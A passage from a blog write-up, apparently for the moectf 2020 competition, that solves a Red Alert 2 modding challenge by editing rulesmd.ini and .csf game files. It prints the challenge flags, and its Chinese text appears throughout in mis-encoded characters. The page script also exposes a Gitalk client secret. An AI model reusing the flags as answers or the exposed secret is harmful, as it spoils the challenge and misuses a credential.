<h3 id="hint-2"><a href="#hint-2" class="headerlink" title="hint - 2"></a>hint - 2</h3><p>hint2æç¤ºäº†æˆ‘ä»¬é€‰æ‹©ç›¸åº”çš„è°ƒè‰²ç›˜ä»¥åŠå¯¹æ¯”mixæ–‡ä»¶å°¾æ•°æ®æ‰¾å‡ºæ­£ç¡®çš„mixæ–‡ä»¶</p>
<p><img src="https://i.loli.net/2020/10/08/RYecQ3KJW7rbkjZ.png" alt="image.png"></p>
</blockquote>
<p>ä½¿ç”¨xcc mixeræå–å‡ºæ¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ”¹å‡ºã€å¤©æ°”æ§åˆ¶ä»ªã€‘æˆ–è®¸å°±èƒ½å¾—åˆ°flag</p>
<p>ä¸ä¼šä¿®æ”¹ä¹Ÿæ²¡å…³ç³»ï¼Œé—ªç”µé£æš´ç›´è¯‘æ˜¯ã€lightningstromã€‘ï¼Œæœç´¢å³å¯æ‰¾åˆ°å¤©æ°”æ§åˆ¶ä»ªã€weather control deviceã€‘çš„ä»£ç </p>
<p><img src="https://i.loli.net/2020/10/08/2sbVG16BrkJEOM8.png" alt="image.png"></p>
<p>å…¶ä¸­çš„å‚æ•°éƒ½æ˜¯æ¯”è¾ƒç®€å•æ˜“è¯»çš„ï¼š</p>
<ul>
<li>Costï¼šå¾ˆæ˜æ˜¾æ˜¯ä»·æ ¼ï¼Œæ”¹ä¸€ä¸ªä½ä¸€ç‚¹çš„å³å¯</li>
<li>RequiredHousesï¼šåé¢è·Ÿç€ä¸€ä¸ª<code>China</code>æç¤ºæˆ‘ä»¬è¿™åº”å½“æŒ‡çš„æ˜¯éœ€æ±‚çš„å›½å®¶ï¼Œä¹Ÿå°±æ˜¯åªæœ‰è¿™ä¸ªå›½å®¶èƒ½å¤Ÿè¿›è¡Œå»ºé€ çš„æ„æ€ï¼Œæ”¹ä¸ºä»»ä¸€ç›Ÿå†›é˜µè¥å›½å®¶åå³å¯ï¼Œå¯ä»¥å‚ç…§ä¸Šæ–¹çš„<code>Owner</code>è¯­å¥å¾—åˆ°å›½å®¶åï¼›å½“ç„¶ï¼Œå¦‚æœæ˜¯æ¯”è¾ƒç†Ÿæ‚‰çº¢è­¦çš„å°ä¼™ä¼´åº”è¯¥çŸ¥é“è¿™ä¸ªè¯­å¥æ˜¯å¯ä»¥ç›´æ¥åˆ é™¤çš„</li>
<li>BuildLimitï¼šå»ºé€ é™åˆ¶ï¼Œæ¨æµ‹æ˜¯æ•°é‡é™åˆ¶ï¼Œ-1è‡ªç„¶æ— æ³•å»ºé€ ï¼Œéšä¾¿æ”¹ä¸€ä¸ªæ­£æ•°å³å¯</li>
<li>TechLevelï¼šç§‘æŠ€ç­‰çº§ï¼Œæˆ‘ä»¬åœ¨é­é‡æˆ˜é¡µé¢æ˜¯å¯ä»¥çœ‹åˆ°æœ‰ä¸ªè°ƒèŠ‚ç§‘æŠ€ç­‰çº§1è‡³10çš„é€‰é¡¹çš„ï¼Œè¿™é‡Œç­‰çº§ä¸º-1è‡ªç„¶æ— æ³•å»ºé€ ï¼Œæ”¹ä¸º1è‡³10ä¸­ä»»ä¸€æ•´æ•°å³å¯</li>
</ul>
<p>æˆ‘ä»¬å¯ä»¥å‘ç°æ¸¸æˆä¸­æç¤ºæˆ‘ä»¬<strong>FLAGå†…å®¹åœ¨è¶…æ­¦é‡Œ</strong></p>
<p><img src="https://i.loli.net/2020/10/08/Ud17cPvarkSs2my.png" alt="image.png"></p>
<p>ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä»…æ”¹æ‰è¿™äº›é™åˆ¶æ¡ä»¶ï¼Œæˆ‘ä»¬ä¼šå‘ç°å‡ºæ¥çš„å¹¶ä¸æ˜¯æ­£ç¡®çš„flagï¼ˆth1s_1s_f4ke_fla9!ğŸ‘‰this is fake flagï¼‰</p>
<p><img src="https://i.loli.net/2020/10/08/8rR1fjKBd2xhqQL.png" alt="image.png"></p>
<p>è€ƒè™‘åˆ°é¢˜ç›®ä¸­æœ‰å†™é“<strong>ã€æ·»åŠ äº†ä¸€ä¸ªçœŸÂ·é—ªç”µé£æš´ã€‘</strong>ï¼Œæ•…æˆ‘ä»¬å¯ä»¥çŸ¥é“flagåº”è¯¥ä¸æ˜¯è—åœ¨åŸè¶…çº§æ­¦å™¨ä¸­</p>
<p><img src="https://i.loli.net/2020/10/08/DTwjCNSy5Fq6ga2.png" alt="image.png"></p>
<p>æˆ‘ä»¬é‡æ–°å›åˆ°<code>rulesmd.ini</code>ï¼Œå¯ä»¥å‘ç°å¦‚ä¸‹è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SuperWeapon&#x3D;LightningStormSpecial</span><br></pre></td></tr></table></figure>

<p>çœ‹åå­—åº”è¯¥æ˜¯è¶…çº§æ­¦å™¨çš„æ„æ€ï¼Œiniä¸­æœç´¢<code>LightningStormSpecial</code>æˆ‘ä»¬å¯ä»¥å‘ç°ä¸€ä¸ªç±»ä¼¼æ³¨å†Œåå•çš„ä¸œè¥¿ï¼Œå…¶ä¸­æœ€æ–°çš„ä¸€ä¸ªä¸º<code>UltimateSpecial</code></p>
<p><img src="C:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1602093565355.png" alt="1602093565355"></p>
<p>å°†å¤©æ°”æ§åˆ¶ä»ªä»£ç ä¸­è¯­å¥<code>SuperWeapon=</code>åé¢çš„<code>LightningStormSpecial</code>æ›¿æ¢ä¸º<code>UltimateSpecial</code>ï¼Œé‡æ–°å°è¯•è¿è¡Œæ¸¸æˆï¼Œå»ºé€ å¤©æ°”æ§åˆ¶ä»ªï¼Œå¾—åˆ°flag</p>
<p>![B_T74BXSD`2@<em>Y</em>LMEZ_BAD.png](<a href="https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png" target="_blank" rel="noopener">https://i.loli.net/2020/10/08/sGNzKtdwMIq8FyE.png</a>)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;enj0y_th3_p0w3r_0f_lig6tn1n9_st0rm!&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<h3 id="hint-3"><a href="#hint-3" class="headerlink" title="hint - 3"></a>hint - 3</h3><p>hint3å‘Šè¯‰æˆ‘ä»¬iniä¿®æ”¹æ—¶éœ€è¦æ³¨æ„é™åˆ¶æ¡ä»¶ï¼Œå¹¶æç¤ºæˆ‘ä»¬çœŸÂ·é—ªç”µé£æš´åº”å½“åœ¨æ–°å¢æ³¨å†Œåè¡¨é‡Œæœ‰</p>
<p><img src="https://i.loli.net/2020/10/08/KR2VgHfd5cezaAF.png" alt="image.png"></p>
</blockquote>
<blockquote>
<h3 id="hint-4"><a href="#hint-4" class="headerlink" title="hint - 4"></a>hint - 4</h3><p>hint4å‘Šè¯‰æˆ‘ä»¬åœ¨csfä¸­ç¢°è¿æ°”</p>
<p><img src="https://i.loli.net/2020/10/08/S3j5dG2kierolQI.png" alt="image.png"></p>
<p>åœ¨å…ˆå‰æˆ‘ä»¬è§£å¯†çš„mixæ–‡ä»¶ä¸­ç¡®å®å­˜åœ¨ä¸€ä¸ªåç¼€åä¸º<code>*.csf</code>çš„æ–‡ä»¶</p>
<p><img src="https://i.loli.net/2020/10/08/FG39pIlXquEgjDS.png" alt="image.png"></p>
<p>hint1ç»™å‡ºçš„å·¥å…·åŒ…åŒ…å«ä¸€ä¸ªCSFEditorï¼Œä»åå­—ä¸Šå°±å¯ä»¥çŸ¥é“æ˜¯ç”¨æ¥ç¼–è¾‘csfæ–‡ä»¶çš„</p>
<p>æ‰“å¼€åæˆ‘ä»¬å¯ä»¥åœ¨<code>NAME</code>å­—æ®µå‘ç°flag</p>
<p><img src="https://i.loli.net/2020/10/08/bj8o5W4wCuvze1Q.png" alt="image.png"></p>
</blockquote>
<blockquote>
<h3 id="EXTRA-å¿«æ·è§£æ³•"><a href="#EXTRA-å¿«æ·è§£æ³•" class="headerlink" title="EXTRA:å¿«æ·è§£æ³•"></a>EXTRA:å¿«æ·è§£æ³•</h3><p>æˆ‘ä»¬åœ¨ä½¿ç”¨winhexæŸ¥çœ‹<code>expandmd98.mix</code>æ—¶å¯ä»¥å‘ç°å¯ä»¥å­—ç¬¦ä¸²<code>Name:UltimateStorm</code>ï¼ŒçŒœæµ‹ä¸ºã€çœŸÂ·é—ªç”µé£æš´ã€‘çš„UIName</p>
<p><img src="https://i.loli.net/2020/10/08/yfndjKzWN6hrUCZ.png" alt="image.png"></p>
<p>ä¸‹è½½ä¸€ä¸ªåŸç‰ˆrulesmd.iniï¼Œéšä¾¿æ›´æ”¹ä¸€ä¸ªå•ä½çš„<code>UIName</code>å­—æ®µä¸º<code>Name:UltimateStorm</code>ï¼Œå†é€ å‡ºæ¥ä¹Ÿå¯ä»¥å¾—åˆ°flag</p>
<p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç›Ÿå†›åŸºåœ°è½¦</p>
<p><img src="https://i.loli.net/2020/10/08/2cbvVt1i3ZRF5DW.png" alt="image.png"></p>
<p>ä¸€è¿›å…¥æ¸¸æˆä¾¿å¯ä»¥å¾—åˆ°flag</p>
<p><img src="https://i.loli.net/2020/10/08/oXghLYjH6aG1n49.png" alt="image.png"></p>
</blockquote>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" rel="tag"># ä¿¡æ¯å®‰å…¨</a>
              <a href="/tags/PWN/" rel="tag"># PWN</a>
              <a href="/tags/ret2shellcode/" rel="tag"># ret2shellcode</a>
              <a href="/tags/python/" rel="tag"># python</a>
              <a href="/tags/ROP/" rel="tag"># ROP</a>
              <a href="/tags/Alphanumeric-Shellcode/" rel="tag"># Alphanumeric Shellcode</a>
              <a href="/tags/CTF/" rel="tag"># CTF</a>
              <a href="/tags/ret2text/" rel="tag"># ret2text</a>
              <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" rel="tag"># æ ˆè¿ç§»</a>
              <a href="/tags/UAF/" rel="tag"># UAF</a>
              <a href="/tags/ret2libc/" rel="tag"># ret2libc</a>
              <a href="/tags/canary/" rel="tag"># canary</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/09/06/%E3%80%90OJ-0x0003-Leetcode%E3%80%91%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E9%83%A8%E5%88%86write-up-by-arttnba3/" rel="prev" title="ã€OJ-0x0003-Leetcodeã€‘åŠ¨æ€è§„åˆ’éƒ¨åˆ†write up by arttnba3">
      <i class="fa fa-chevron-left"></i> ã€OJ-0x0003-Leetcodeã€‘åŠ¨æ€è§„åˆ’éƒ¨åˆ†write up by arttnba3
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/09/08/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x04%E3%80%91BUUOJ-Pwn-write-up-by-arttnb3/" rel="next" title="ã€CTFé¢˜è§£-0x04ã€‘BUUCTF-Pwn write up by arttnb3">
      ã€CTFé¢˜è§£-0x04ã€‘BUUCTF-Pwn write up by arttnb3 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-ç»ªè®º"><span class="nav-number">1.</span> <span class="nav-text">0x00.ç»ªè®º</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-Pwn"><span class="nav-number">2.</span> <span class="nav-text">0x01.Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwnä»å…¥é—¨åˆ°å…¥ç‹±"><span class="nav-number">2.1.</span> <span class="nav-text">Pwnä»å…¥é—¨åˆ°å…¥ç‹±</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Welcome"><span class="nav-number">2.2.</span> <span class="nav-text">Welcome</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-Pwn-ret2text"><span class="nav-number">2.3.</span> <span class="nav-text">Baby Pwn - ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Baby-Shellcode-shellcode"><span class="nav-number">2.4.</span> <span class="nav-text">Baby Shellcode - shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#unusual-shellcode-Alphanumeric-Shellcode"><span class="nav-number">2.5.</span> <span class="nav-text">unusual shellcode - Alphanumeric Shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP1-ret2text"><span class="nav-number">2.6.</span> <span class="nav-text">ROP1 - ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ROP2-ret2text"><span class="nav-number">2.7.</span> <span class="nav-text">ROP2 - ret2text</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-migration-stack-migration-ret2shellcode"><span class="nav-number">2.8.</span> <span class="nav-text">baby migration - stack migration + ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Hard-shellcode-ret2shellcode"><span class="nav-number">2.9.</span> <span class="nav-text">Hard shellcode - ret2shellcode</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#easycppï¼ˆå·²ä¸‹çº¿ï¼‰-Use-After-Free"><span class="nav-number">2.10.</span> <span class="nav-text">easycppï¼ˆå·²ä¸‹çº¿ï¼‰ - Use After Free</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#baby-canary-canary-partial-overwrite-ret2libc"><span class="nav-number">2.11.</span> <span class="nav-text">baby canary - canary + partial overwrite + ret2libc</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-Misc"><span class="nav-number">3.</span> <span class="nav-text">0x02.Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#ç®€-å•-çš„ç¤¾å·¥é¢˜"><span class="nav-number">3.1.</span> <span class="nav-text">ç®€ å• çš„ç¤¾å·¥é¢˜</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ä¸-ä¼š-å§-ï¼Ÿ-å°±-è¿™-Â¿"><span class="nav-number">3.2.</span> <span class="nav-text">ä¸ ä¼š å§ ï¼Ÿ å°± è¿™ Â¿</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#A3FXCK"><span class="nav-number">3.3.</span> <span class="nav-text">A3FXCK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤"><span class="nav-number">3.4.</span> <span class="nav-text">â‘¨çš„å®Œç¾ç®—æœ¯æ•™å®¤</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#é—ª-ç”µ-é£-æš´"><span class="nav-number">3.5.</span> <span class="nav-text">é—ª ç”µ é£ æš´</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-1"><span class="nav-number">3.5.1.</span> <span class="nav-text">hint-1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-2"><span class="nav-number">3.5.2.</span> <span class="nav-text">hint - 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-3"><span class="nav-number">3.5.3.</span> <span class="nav-text">hint - 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#hint-4"><span class="nav-number">3.5.4.</span> <span class="nav-text">hint - 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXTRA-å¿«æ·è§£æ³•"><span class="nav-number">3.5.5.</span> <span class="nav-text">EXTRA:å¿«æ·è§£æ³•</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="arttnba3"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">arttnba3</p>
  <div class="site-description" itemprop="description">- åšäº†å…³äºä½ çš„æ¢¦ï¼Œæ‰€ä»¥ä¸æ„¿é†’æ¥å‘¢ -</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">5</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">45</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/arttnba3" title="GitHub â†’ https:&#x2F;&#x2F;github.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1543127579@qq.com" title="E-Mail â†’ mailto:1543127579@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://weibo.com/u/7518681149" title="Weibo â†’ https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;7518681149" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://twitter.com/arttnba3" title="Twitter â†’ https:&#x2F;&#x2F;twitter.com&#x2F;arttnba3" rel="noopener" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
      </span>
  </div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Friends' Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top" rel="noopener" target="_blank">Reverier</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://luoq1an.github.io/" title="https:&#x2F;&#x2F;luoq1an.github.io" rel="noopener" target="_blank">luoqian</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://ll1ng.github.io/" title="https:&#x2F;&#x2F;ll1ng.github.io" rel="noopener" target="_blank">ling</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://shal10w.github.io/" title="https:&#x2F;&#x2F;shal10w.github.io" rel="noopener" target="_blank">shallow</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://eqqie.cn/" title="https:&#x2F;&#x2F;eqqie.cn" rel="noopener" target="_blank">eqqie</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://cor1e.cn/" title="https:&#x2F;&#x2F;cor1e.cn" rel="noopener" target="_blank">cor1e</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://yunq1ao.com/" title="https:&#x2F;&#x2F;yunq1ao.com" rel="noopener" target="_blank">yunqiao</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io" rel="noopener" target="_blank">mercer</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">arttnba3</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  
  <script>
    (function(){
      var canonicalURL, curProtocol;
      //Get the <link> tag
      var x=document.getElementsByTagName("link");
		//Find the last canonical URL
		if(x.length > 0){
			for (i=0;i<x.length;i++){
				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
					canonicalURL=x[i].href;
				}
			}
		}
    //Get protocol
	    if (!canonicalURL){
	    	curProtocol = window.location.protocol.split(':')[0];
	    }
	    else{
	    	curProtocol = canonicalURL.split(':')[0];
	    }
      //Get current URL if the canonical URL does not exist
	    if (!canonicalURL) canonicalURL = window.location.href;
	    //Assign script content. Replace current URL with the canonical URL
      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
  </script>















  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID    : 'a040036b8e5ab6a9838d',
      clientSecret: '7b9006697fe7a78e56f22a025caf2deb03e14ea8',
      repo        : 'BlogComment',
      owner       : 'SakuraiHimeki',
      admin       : ['SakuraiHimeki'],
      id          : '0b6d8a40d758f449d110e97d89c6e8e6',
        language: '',
      distractionFreeMode: false
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
